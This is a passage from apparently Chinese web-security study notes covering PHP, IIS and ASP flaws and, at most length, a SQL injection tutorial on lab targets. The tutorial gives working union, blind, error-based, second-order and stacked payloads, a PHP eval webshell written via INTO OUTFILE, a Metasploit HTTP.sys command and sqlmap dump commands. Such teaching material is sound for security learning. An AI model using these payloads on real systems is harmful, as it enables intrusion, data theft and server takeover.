filename=&quot;&quot;);header(&quot;Content-Length: &quot; . filesize($file));readfile($file);\n\n\n\n文件编辑\n1.file_get_contents() 读取文件内容\n\n2.fopen() fread() 文件打开读入\n\n存在的安全漏洞：跨过对操作文件的执行，进行对其他目录文件的执行，如果使用了系统命令那么可以使用管道符进行进一步的命令操作\n\n\n六、PHP应用&amp;模版引用&amp;Smarty渲染&amp;MVC模型&amp;数据联动新闻列表\n1.数据库创建新闻存储\n\n2.代码连接数据库读取\n\n3.页面进行自定义显示\n\n\n自写模版应用\n1.页面显示样式编排\n2.显示数据插入页面\n3.引用模版调用触发\n在数据库行里添加php代码，会运行\n访问html代码页面，里面的php代码不会执行，但是php文件应用了含有php代码的html文件，则会执行html文件里面的代码\n\nSmarty模版引用\n作用：渲染页面，提升美观，安全\n\n下载：https://github.com/smarty-php/smarty/releases\n\n使用：\n\n1.创建一个文件夹，命名为samrty-demo\n2.下载Smarty对应的版本并解压到该文件夹中\n3.创建一个php文件，命名为index.php，并在文件中添加以下代码\n\n12345678910111213141516171819202122232425262728293031&lt;?php// 引入 Smarty 类文件require(&#x27;smarty-demo/libs/Smarty.class.php&#x27;);// 创建 Smarty 实例$smarty = new Smarty;// 设置 Smarty 相关属性$smarty-&gt;template_dir = &#x27;smarty-demo/templates/&#x27;;$smarty-&gt;compile_dir = &#x27;smarty-demo/templates_c/&#x27;;$smarty-&gt;cache_dir = &#x27;smarty-demo/cache/&#x27;;$smarty-&gt;config_dir = &#x27;smarty-demo/configs/&#x27;;// 赋值变量到模板中$smarty-&gt;assign(&#x27;title&#x27;, &#x27;欢迎使用 Smarty&#x27;);// 显示模板$smarty-&gt;display(&#x27;index.tpl&#x27;);?&gt;\n\n\n4.创建一个名为index.tpl的模版文件，并将一下代码复制到上述点定义文件夹中\n\n123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#123;$title&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&#123;$title&#125;&lt;/h1&gt;&lt;p&gt;这是一个使用 Smarty 的例子。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n\n代码RCE安全测试\n1.自写模版的安全隐患\n\n2.第三方Smarty的安全隐患\n\n从功能点上面找漏洞\n\n项目用到的组件，可能有漏洞，思考组件会不会调用到关键函数\n\n\n七、PHP应用&amp;ThinkPHP框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞TP框架-开发-配置架构&amp;路由&amp;MVC模型\n参考：https://www.kancloud.cn/manual/thinkphp5_1\n1.配置架构-导入引用\n2.路由访问-URL访问\n3.数据库操作-应用对象\n4.文件上传操作-应用对象\n5.前端页面渲染-MVC模型\n\nTP框架-安全-不安全写法&amp;版本过滤绕过\n1.内置代码写法\n例子：不合规的代码安全绕过-TP5-自写\n\n\n2.框架版本安全\n例子：写法内置安全绕过-TP5-SQL注入\n例子：内置版本安全漏洞-TP5-代码执行\n\n\n\n逻辑漏洞\n用户身份在数据库中有uid类似的数据，这项数据不同数值会表示不同身份（管理员，会员，游客等等），通过修改这项数据，可以跨身份。\n\nJS开发JAVA开发WEB攻防ASP安全默认安装-MDB数据库泄露下载\n由于大部分ASP程序与ACCESS数据库搭建，但ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解密数据实现攻击\n\nHTTP.sys远程执行代码漏洞HTTP.SYS（CVE-2015-1635）\nhttps://blog.csdn.net/qq_41210745/article/details/103437683\n\n漏洞描述：\n\n远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。\n\n\n影响版本：\n\nWindows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2\n\n\n漏洞利用条件：\n\n安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本\n\n\n漏洞复现：\n123456789msfconsoleuse auxiliary/dos/http/ms15_034_ulonglongaddset rhosts xx.xx.xx.xxset rport xxrun\n\nIIS短文件\n介绍：\n此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息\n\n\n漏洞成因：\n为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir &#x2F;x\n\n\n应用场景：\n后台路径获取，数据库文件获取，其他敏感文件获取等\n\n\n利用工具：\nhttps://github.com/irsdl/IIS-ShortName-Scanner\nhttps://github.com/lijiejie/IIS_shortname_Scanner\n\n\n\nIIS文件解析（IIS 6 无补丁）\n该版本默认会将*.asp;.jpg此种格式的文件名，当成asp解析\n该版本默认会将*.asp&#x2F;目录下的所有文件当成asp解析\n\nPHP-SQL注入一、相关基础1.MYSQL-Web组成架构\n服务器安装MYSQL数据库，搭建多个站点，数据库集中存储MYSQL数据库中管理，可以都使用root用户管理也可以创建多个用户进行每个网站对应的数据库管理\n\n（1）统一交给root用户管理\n\nwww.zblog.com  &#x3D; zblog  &#x3D; root &#x3D;&gt;MYSQL\nwww.demo01.com &#x3D; demo01 &#x3D; root &#x3D;&gt;MYSQL\n\n（2）一对一用户管理（推荐）\n\nwww.zblog.com  &#x3D; zblog  &#x3D; zblog &#x3D;&gt;MYSQL\nwww.demo01.com &#x3D; demo01 &#x3D; demo01 &#x3D;&gt;MYSQL\n\n2.常规查询\n获取相关数据：\n\n1、数据库版本-看是否符合information_schema查询-version() –SELECT VERSION();\n\n2、数据库用户-看是否符合ROOT型注入攻击-user() –SELECT USER();\n\n3、当前操作系统-看是否支持大小写(Linux区分大小写)或文件路径选择-@@version_compile_os\n\n4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()\n\nMYSQL 5.0以上版本：自带的数据库名为information_schema\n123information_schema  #存储数据库下的数据库名及表名，列名信息的表&quot;.&quot;代表下一级 select *from security.usersinfomation_schema.schemata #记录数据库的表\n\n\n1information_schema.tables   #记录表名信息的表\n\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (1).png)\n1information_schema.columns   #记录列名信息表\n\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (2).png)\n1234567schema_name：information_schema.schemata  #记录数据库名信息的列名值（数据库名字）table_schema：information_schema.tables   #记录数据库名的列名值table_name：information_schema.tables     #记录表名的列名值column_name：information_schema.columns   #记录列名的列名值\n\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (3).png)\n\n\n\n\n简单注入流程：\n1234567891011order by 6   #确认有几列，报错与不报错，取不报错那列union select 1,2,3,4,5,6   #找能看见回显的union select 1,2,3,database(),user(),6    #联合查询数据库名和数据库连接的用户union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema = ‘demo1’   #查demo1数据库中的表名，group_concat是查全部的表名 union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema = ‘demo1’  and table_name = ‘admin’    #查admin表中的列名union select 1,2,3,4，group_concat(id,usename,password),6 from admin\n\n3.跨库查询\n影响条件：当前数据库root用户权限\n\n测试不同数据库用户：root demo\n\nhttp://127.0.0.1/sql/Less-1/?id=-1&#39; union select 1,group_concat(schema_name),3 from infoemation_schema.schemata --+\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (4).png)\n\nhttp://127.0.0.1/sql/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema.tables where table_schema = &#39;test&#39; --+\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (5).png)\n\nunion select 1,2,3,4,group_concat(coulmn_name),6 from information_schema.columns where table_name = &#39;zbp_member&#39; and table_schema = &#39;zblog&#39;\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (6).png)\n\nunion select 1,group_concat(id,uname,pword),3 from test.admin --+\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (7).png)\n\n\n4.文件续写\n影响条件：\n\n1、当前数据库用户权限（root权限才可以续写）\n2、secure-file-priv设置（目录限制）（my.ini –secure_file_priv&#x3D;“”）\n\n\n操作步骤：\n\nunion select 2,load_file(&#39;d:\\\\1.txt&#39;),3\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (8).png)\n\nunion select 1,&#39;&lt;?php eval(@$_POST[1]); ?&gt;&#39;,3 into outfile &#39;D:/phpstudy_pro/www/sql/shell.php&#39;\n![](..&#x2F;images&#x2F;网安知识点&#x2F;image (9).png)\n\n\n\n写入存在的一些问题：\n\n1、写入的内容其中 “ ” 单引号会引起报错（可能是没有闭合）\n2、目录\\和&#x2F;，win用&#x2F;比较好\n\n\n解决：单引号过滤绕过方式\n\nSQL注入语句中用单引号就不要用编码（0x十六进制），编码就不用单引号（路径，表名，数据库名等）\n\n\n读写的路径的问题：\n\n1.报错显示获取路径\n2.phpinfo页面泄露\n\n\n如果不知道路径思路：\n\n利用常见的默认的中间件，数据库等安装路径读取有价值的信息\n\n\n\n5.网上相关资料\n五大主流数据库比较：https://blog.csdn.net/amork/article/details/6830353\nMYSQL中concat()、concat_ws()、group_concat函数使用技巧心得：https://zhuanlan.zhihu.com/p/257399676\nSQL注入中无法利用information_scema的情况：https://blog.csdn.net/qq_43936524/article/details/116796087\n查询数据库的数据库名和表名（mysql、mssql、oracle）\n\n二、基础绕过方法1.数据请求类型\nSQL语句由于在黑盒中是无法预知写法的，SQL注入能发成功是需要拼接原SQL语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原SQL语句的未知性导致的拼接失败！\n由于开发者对于数据类型和SQL语句写法（框架写法）导致SQL注入拼接失败\n\n12345678910111213141516171. 数字型（无符号干扰）select * from news where id = $id;2. 字符型（有符号干扰）select * from news where id = &#x27;$id&#x27;;select * from news where id = &quot;$id&quot;;3. 搜索型（有多个符号干扰）select * from news where id like &#x27;%$id%&#x27;;select * from news where id like &quot;%$id%&quot;;select * from news where id like &#x27;_$id_&#x27;;select * from news where id like &quot;_$id_&quot;;4. 框架型（有各种符号干扰）select * from news where id = (&#x27;$id&#x27;);select * from news where id = ((&quot;$id&quot;));select * from news where (id = &#x27;$id&#x27;);\n\n\n\n2.数据请求方法\n全局变量方法：\n\n$_GET[]：GET方法获取参数\n$_POST[]：POST方法获取参数\n$_SERVER[]：获取服务器&#x2F;客户端的信息，比如UA头、XFF头、Rerferer头等\n$_FILE[]：获取文件信息\n$_COOKIE[]：获取Cookie信息\n\n\nUser-Agent:\n\n使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中\n\n\nCookie:\n\n网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）.\n\n\nRerfere:\n\n浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.\n\n\nHost：\n\n客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号\n\n\n墨者X-Forwarded-For注入漏洞实战：https://blog.csdn.net/qq_49780354/article/details/123402925\n\n如功能点：\n\n1.用户登录时\n2.登录判断ip时，是PHP特性中的$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];接受IP的绕过（只有php才有xff头可以改ip）\n实现：代码配置固定IP去判断-策略绕过\n实现：数据库白名单IP去判断-select注入\n实现：防注入记录IP去保存数据库-insert注入\n\n\n3.文件上传将文件名写入数据库-insert注入\n\n\n\n3.数据库请求格式\n1.数据采用统一格式传输，后端进行格式解析带入数据库（json）\n2.数据库采用加密编码传输，后端进行解密解码带入数据库（base64）\n\n4.文件头注入-非常规注入语句\n同样，如果它有这样的需求，有插入像图片、音频这样的文件\n并且在后端会将文件名这些东西保存到数据库里，那就可能会导致注入\n这里引出的内容就是SQL注入不止是SELECT查询注入，像INSERT、UPDATE、DELETE这些也存在注入\n这些应该会在之后的课程中讲到，这里只需要知道有这些注入方式即可\n参考文章：利用insert、update和delete注入获得数据  https://www.cnblogs.com/babers/articles/7252401.html\n\n5.XFF头绕过-绕过ip检测\nX-Forwarded-For是一个 HTTP 扩展头部，用于标识通过代理服务器连接到 Web 服务器的客户端的原始 IP 地址。它最初由 Squid 缓存代理软件引入，现在已成为事实上的标准，被广泛应用于 HTTP 代理、负载均衡等转发服务，并被写入 RFC 7239（Forwarded HTTP Extension）标准。\n\n这个东西是一个记录IP的参数，假设开发者需要记录用户的登录IP，然后判断这个IP是不是属于内网地址啊，如果是内网地址才让登录，不是就不让登录； 或者就仅仅是记录一下IP等等。\n\n如果是后者，那么是不是就是我们上面讲的非常规的注入点之一啊？\n\n如果是前者，那么我们就可以通过伪造XFF头尝试绕过检测，进行SQL注入\n\n我们通过sqli-libs来进行演示，我们找到第11关的源码，然后在登录判断前添加如下代码：\n1234567891011121314151617181920212223242526272829303132function getClientIp() &#123;      if (getenv(&#x27;HTTP_CLIENT_IP&#x27;) &amp;&amp; strcasecmp(getenv(&#x27;HTTP_CLIENT_IP&#x27;), &#x27;unknown&#x27;)) &#123;          $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;);      &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;) &amp;&amp; strcasecmp(getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;), &#x27;unknown&#x27;)) &#123;          $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;);          $ips = explode(&#x27;,&#x27;, $ip);          $ip = $ips[0];      &#125; elseif (getenv(&#x27;REMOTE_ADDR&#x27;) &amp;&amp; strcasecmp(getenv(&#x27;REMOTE_ADDR&#x27;), &#x27;unknown&#x27;)) &#123;          $ip = getenv(&#x27;REMOTE_ADDR&#x27;);      &#125; elseif (isset($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] &amp;&amp; strcasecmp($_SERVER[&#x27;REMOTE_ADDR&#x27;], &#x27;unknown&#x27;)) &#123;          $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;];      &#125; else &#123;          $ip = &#x27;unknown&#x27;;      &#125;      return $ip;  &#125;$ip = getClientIp();  // 只有当ip为192.168.0.1访问时，允许登录if ($ip == &quot;192.168.0.1&quot;) &#123;      if($row)      &#123;  \t    // 原本正确输出代码    &#125;      else      &#123;          // 原本错误输出代码    &#125;  &#125; else &#123;      echo &quot;&lt;h1&gt;禁止访问！&lt;/h1&gt;&quot;;  &#125;\n\n什么意思呢？就是我在登录时需要判断用户的登录IP，这个IP值我从HTTP_CLIENT_IP或HTTP_X_FORWARDED_FOR等这些地方得到，然后IP值为192.168.0.1时我才允许登录\n\n\n三、盲注\n盲注就是在注入过程中，获取的数据不能回显至前端页面。我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注\n\n1.增删改查\n数据查询\nSELECT *FROM news where id &#x3D; $id\n\n\n新增用户，添加新闻等\nINSERT INTO news (字段名) VALUES (数据)\n\n\n删除用户，删除新闻等\nDELETE FROM news WHERE id&#x3D;$id\n\n\n修改用户，修改文章等\nUPDATE news SET id&#x3D;$id\n\n\n\n2.布尔盲注-逻辑判断\n所谓布尔盲注，布尔是True和False的意思，就是页面有两种状态，如果我们输入正确的数值就正常（正常回显数据），输入错误的数值就异常（比如某一部分显示空白）\n\n那此时就说明页面有两种状态，那么我们就可以基于页面的状态判断我们注入的SQL语句是否正确执行\n\n条件：要有可以判断的bool回显\n\nregexp,like,ascii,left,ord,mid\n\n\n注入过程：\n123456789101112# 布尔盲注1. and length(database()) = 7;   # 判断数据库名长度是否为72. and left(database(), 1) = &#x27;p&#x27;;  # 判断数据库名前1位字符是否为p3. and left(database(), 2) = &#x27;pi&#x27;; # 判断数据库名前2位字符是否为pi4. and substr(database(), 2, 1) = &#x27;i&#x27;;  # 判断数据库名从第2位开始后面长度为1（第3位）的字符是否为i5. and ord(left(database(), 1)) = 112; # 判断数据库名前1位字符转为ascii码之后是否等于112，用于绕过引号检测6. and asscii(substr(database(), 1, 1)) &gt; 97; # 判断数据库名第1位字符转为asscii码之后是否大于97，同样用于绕过\n\n以Sqli-labs第8关作为演示案例，当我们输入id&#x3D;1时，显示一个页面：\n\n\n当我们输入id = 1&#39;时，显示另一个画面：\n\n\n可以很明显的看到下面的You are in.......不见了，那这时就可以使用布尔注入去猜数据\n\n那这里我们就可以使用上面的语句尝试猜测一下它的数据库名，payload为：1&#39; and length(database()) = 7 --+：\n\n\n回显错误页面，说明长度，改成8：\n\n\n回显出正确页面，说明数据库名长度等于8，然后我们就可以进一步猜测数据库名的每个字符等等，这个一般都用脚本或工具来跑，手注太慢了\n\n相关资料：https://blog.csdn.net/wangyuxiang946/article/details/123486880\n\n\n3.时间盲注- 延时判断\n时间盲注，也称延时注入，一般是 if 条件语句搭配 sleep() 函数使用，通过条件的正确与否导致页面产生不同程度的延迟来实现注入\n\n它在实战中经常用来判断某个地方是否存在SQL注入；同时当页面没有任何回显&#x2F;变化时，可以通过它来实现注入\n\n注入过程\n1231. and sleep(1); # 休眠1s2. and if(length(database()) = 7, sleep(1), 0); # 如果数据库名长度等于7，休眠1s，否则等于0\n\n这里以Sqli-labs第9关进行演示，这里是单引号闭合方式，输入id=1：\n\n\n然后输入id=1&#39;尝试让其闭合报错：\n\n\n可以看到没有任何反应，页面也没啥变化，你甚至可能都不确定这到底是不是个注入点\n\n那么此时就可以使用延时注入来判断一下，这里输入id=1&#39; or if(1, sleep(2), sleep(0)) --+，然后抓包看一下是否会成功延时3秒：\n\n\n可以看到确实延迟了2s，说明我们这个语句成功执行了，那么我们就可以使用上面的语句进行注入了，比如判断数据库名的长度等等，这里就不再演示\n\n相关资料：https://blog.csdn.net/wangyuxiang946/article/details/123857045\n\n\n4.报错注入-报错回显\n其实这个也算是有回显的注入类型了，所谓报错注入就是，开发者人员为了方便调试，会将SQL语句执行错误后的报错信息输出到前端页面当中\n\n试用情况：页面有数据库的报错信息：\n\n报错信息必须是动态的，来自数据库的报错信息\n网站是写死的、自定义的报错不算\n\n\n一般在php中是这段代码：\n\n\n1die(mysqli_error($conn));\n\n\n如果代码审计中看到这个东西，那就可以尝试报错注入\n\n注入过程：\n1234567891011121314?id=-1&#x27; and updatexml(1,&#x27;~&#x27;,3) #检查报错信息是否正常回显?id=-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(schema_name)from information_schema.schemata), 1 , 31)),3)   #获取所有数据库?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;), 1 , 31)),3)    #获取所有表名?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;), 1 , 31)),3) #获取所有字段?id=1&#x27;and updatexml(1, concat(0x7e, (SELECT version(), 0x7e)), 1);  # 报错回显出当前MySQL版本号?id=1 and extractvalue(1, concat(0x5c, (SELECT table_name from information_schema.tables limit 1))); #报错回显出当前第一行表名\n\n原理：upadatexml函数，当第二个参数包含特殊符号时如0x7e就会报错成~，并将第二个参数的内容显示在报错信息中\n\nconcat：拼接特殊符号个查询结果\n\n长度限制：updatexml() 函数的报错内容长度不能超过32个字符，常用的解决方式有两种：\n\nlimit 分页\nsubstr()截取字符\n\n123456?id=-1&#x27; and updatexml(1,concat(0x7e,(select userfrom mysql.user limit 1,1)),3)  #linmit，limit(0,1)展示第0条数据，limit(1,1)展示第一条数据?id=-1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user)from mysql.user), 1 , 31)),3)#substr(),从第一个字符截取到31个字符\n\n\n\n\n这里同样以Sqli-labs第1关为例，我们可以看看代码是怎么写的：\n123456789101112131415161718192021222324252627if(isset($_GET[&#x27;id&#x27;]))  &#123;      $id=$_GET[&#x27;id&#x27;];  //logging the connection parameters to a file for analysis.      $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);      fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);      fclose($fp);    // connectivity         $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;      $result=mysql_query($sql);      $row = mysql_fetch_array($result);        if($row)      &#123;          // 显示正常页面    &#125;      else      &#123;          echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;          print_r(mysql_error());    // 最主要就是加了一句这个代码！        echo &quot;&lt;/font&gt;&quot;;      &#125;  &#125;  else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;\n\n我们输入id=1，正常回显：\n\n\n当我们输入id=1&#39;时，就会产生SQL语句报错：\n\n\n那此时就可以使用报错注入，比如输入payload为id=1&#39; and updatexml(1,concat(0x7e, database(), 0x7e),1) --+：\n\n\n就成功爆出数据库名了，接下来就和union select差不多的步骤，通过information_schema爆出其他数据\n\n相关资料：https://blog.csdn.net/wangyuxiang946/article/details/123416521\n\n\n5.注入条件-数据回显&amp;错误处理\n基于延时：都不需要\n1and if(1, sleep(5), 0);\n\n基于布尔：有数据库输出判断标准\n1and length(database()) = 6;\n\n基于报错：有数据库报错处理判断标准\n1and updatexml(1,concat(0x7e, (SELECT version(), 0x7e), 1))\n\n测试delete注入：（有无回显，有无报错）\n\n延迟：1 or if (1, sleep(5), 0)\n布尔：&#x3D;&#x3D;3 and length(database())&#x3D;6&#x3D;&#x3D;（无回显，无法判断注入）\n报错：4 and updatexml(1, concat(0x7e, (SELECT version(), 0x7e), 1))\n\n\n\n四、进阶注入1.二次注入\n什么是二次注入，其实很简单，它满足的条件就是先插后取 &#x3D;&#x3D;&gt; 先执行插入操作，再执行查询&#x2F;更新操作\n简单来说就是，数据库会先插入我们恶意的SQL语句，但在当前的功能点这个恶意SQL语句是不执行的；我们可以通过另外一个地方去尝试让服务器自己调用这个恶意SQL语句，达到注入的效果\n那你会问，插入时SQL语句都不执行，后面为什么会执行呢？、\n这里就是二次注入的关键点：它需要在执行插入语句的时候将我们代码中的引号这些转义掉\n而在数据库中插入数据时出现转义符会将转义符去掉，然后将全部字符当作字符串处理，就不会导致提前闭合\n\n\n\n\n\n这里用 Sqli-labs 第24关演示一下\n\n假设我们知道用户名是admin，但是不知道密码是多少\n\n\n首先尝试一下万能密码admin&#39; or 1=1 #：\n\n\n登录失败，提示我是个愚蠢的黑客，说明有过滤，看一看源码login.php：\n12345678910111213$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);  $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);  $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;  //$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;  $res = mysql_query($sql) or die(&#x27;You tried to be real smart, Try harder!!!! :( &#x27;);  $row = mysql_fetch_row($res);  //print_r($row) ;  if ($row[1]) &#123;      return $row[1];  &#125; else &#123;      return 0;  &#125;\n\n可以看到使用了mysql_real_escape_string()函数，这个函数就是用来转义我们的输入的引号，他会转义成\\&#39;或者\\&quot;，所以我们无法注入\n\n我们看到他有修改密码的选项，我们看能不能试着修改admin的密码，发现这里点不了：\n\n\n看一看源码，有什么触发条件：\n123456789101112131415161718// 从SESSION中取出&quot;username&quot;$username= $_SESSION[&quot;username&quot;];  $curr_pass= mysql_real_escape_string($_POST[&#x27;current_password&#x27;]);  $pass= mysql_real_escape_string($_POST[&#x27;password&#x27;]);  $re_pass= mysql_real_escape_string($_POST[&#x27;re_password&#x27;]);    if($pass==$re_pass)  &#123;  \t// 更新密码！    $sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;      $res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);      // 其他代码&#125;  else  &#123;      // 其他代码&#125;  \n\n他需要有SESSION值才行，说明要先登录，然后我们看到他下面有一个更新数据的SQL语句\n\n这里有一个很重要的点就是：他不是我们输入username的方式去接收该参数的\n\n也就是说这里他不会对username的值做任何转义操作，所以假设我的用户名是admin&#39; #，那么他的更新语句就会变成：\n1UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27; # &#x27; and password=&#x27;admin123&#x27;;\n\n那么实际执行的SQL语句就是UPDATE users SET PASSWORD=&#39;123456&#39; where username=&#39;admin&#39;，将admin用户的密码更改为了123456，那我们就可以直接登录了\n\n好，现在思路有了，我们就找一找哪里能够让我们的SESSION中username为admin&#39; #\n\n那这里刚好有注册按钮，又看一看注册用户的源码login_create.php：\n123456789101112131415161718192021222324252627282930313233// 判断用户名是否已存在$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;  $pass= mysql_escape_string($_POST[&#x27;password&#x27;]);  $re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);    echo &quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;  // 查询用户名是否已存在$sql = &quot;select count(*) from users where username=&#x27;$username&#x27;&quot;;  $res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);  $row = mysql_fetch_row($res);// 如果用户名已存在if (!$row[0]== 0)  &#123;      // 不重要的代码&#125;  // 如果用户名不存在 ==&gt; 重要的点在这里else  &#123;      if ($pass==$re_pass)      &#123;  \t    // 更新数据SQL语句！        $sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;;          // 其他代码    &#125;      else      &#123;  \t    // 其他代码    &#125;  &#125;\n\n可以看到这里仍然有转义语句，所以也没办法注入，但是这也说明了我可以注册带有特殊字符的名字\n\n所以我们注册用户admin&#39; #，密码为123456\n\n\n那么我们再利用这个账号登录，让username存入SESSION中，然后修改密码，不就可以实现我们的设想了吗？\n\n\n\n好，现在成功登录，然后我们修改密码为12345：\n\n\n这时候按我们的推测应该是修改的admin的密码，那直接登录一下：\n\n\n成功登录， 当然了，这里因为他有die()函数，那么你是不是可以尝试报错注入啊，把用户名修改成aa&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),3) #看一看，但是这里他限制了用户名长度，所以pass\n\n总的来说，如果要形成二次注入，需要满足以下条件：\n\n业务逻辑中数据是先插后取的\n数据插入时有转义函数（mysql_escape_string()、addslashes()）\n后续查询&#x2F;更新其他数据需要用到插入的数据\n\n\n可以看到二次注入需要满足的条件还是很苛刻的，所以实战中很少用到，需要测试的点太多了\n\n测试思路：\n\n黑盒测试：分析功能有添加后对数据操作的地方（功能点）\n白盒测试：insert 后进入 select 或 updata 的功能的代码块\n\n\n\n2.堆叠注入\n堆叠注入，也很简单，就是能够同时执行多条恶意SQL语句，每条语句使用;隔开\n\n原理很简单，但是实战中很难碰到，因为他的触发条件也比较苛刻，需要满足以下条件：\n\n目标存在SQL注入漏洞\n目标不能过滤分号（;）\n目标中间层查询数据库信息时可以同时执行多条SQL语句\n使用的数据库支持堆叠注入（MySQL、MSSQL、Postgresql等）\n\n\n在php中，需要有mysqli_multi_query()函数\n\n所以实战中基本碰不到，但CTF可能会碰到，如果不打CTF，那了解原理即可\n\n实战案列：BUUCTF 中的[强网杯 2019 随便注]\n\n\n判断是字符型还是数字型，输入1&#39;会产生报错：\n\n判断闭合符为单引号，这里就不尝试其他的注入方法了，直接堆叠注入，payload为&#39;;show databases;#“：\n\n\n出库名了，然后看一下show tables表名： \n\n\n然后尝试select * from 191xxx读取第一个表的值：\n\n\n提示不让用select，那就尝试绕过吧，这里绕过语句为1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#\n\n成功拿到flag\n\npayload的由来可以看：https://blog.csdn.net/m0_73734159/article/details/134049744\n\n\n五、SQLMAP的使用\nsqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。\n详细资料：https://www.cnblogs.com/bmjoker/p/9326258.html\n\n1.基础语句1python sqlmap.py -u &quot;http://xxx&quot;\n\n2.判断当前数据库的信息123--current-user : 查看当前数据库用户--privileges : 查看当前用户权限--is-dba : 查看当前用户是否为管理员\n\n3.获取数据库的敏感信息12345--current-db : 获取当前数据库名称--tables : 获取所有数据库下的所有表名--tables -D &quot;&quot; : 获取指定数据库名下的表名--columns -T &quot;&quot; -D &quot;&quot; : 获取指定数据库名下，指定表名下的列名--dump -C &quot;&quot; -T &quot;&quot; -D &quot;&quot; : 获取指定数据库名下，指定表名下，指定列名下的数据\n\n4.文件读取12--file-read &quot;&quot; : 读取目标文件--file-write &quot;&quot; --file-dest &quot;&quot; : 将本地文件写入服务器目标文件\n\n\n这里需要满足的条件：\n\n网站必须是root权限\n具有读写权限（比如 mysql 需要关闭 secure_file_priv）\n需要知道网站的绝对路径\n\n\n比如使用--file-read读取D:\\\\1.txt文件：\n\n\n这里它就帮我们下载好了放到了 